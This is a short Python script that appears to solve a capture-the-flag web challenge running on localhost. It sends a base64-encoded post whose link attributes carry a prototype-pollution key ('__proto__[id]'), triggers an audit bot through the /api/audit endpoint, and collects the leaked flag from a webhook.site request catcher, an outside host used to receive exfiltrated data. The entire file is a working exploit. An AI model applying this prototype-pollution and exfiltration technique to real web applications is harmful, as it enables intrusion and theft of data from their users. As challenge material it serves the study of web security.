import json
import base64
import requests

CHALL_URL = 'http://localhost:3000'

res = requests.post('https://webhook.site/token')
token = res.json()['uuid']

payload = {
    'title': '',
    'content': '',
    'links': [
        {
            'name': '',
            'href': f'https://webhook.site/{token}',
            'attributes': {
                '__proto__[id]': 'debugger'
            }
        }
    ]
}

postId = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode()
res = requests.post(f'{CHALL_URL}/api/audit', json={
    'postId': postId,
})

assert res.status_code == 200


res = requests.get(f'https://webhook.site/token/{token}/request/latest')
data = res.json()
content = json.loads(data['content'])

b64flag = content['defaultId'][len('animate-'):]
flag = base64.urlsafe_b64decode(b64flag + '===').decode()
print(flag)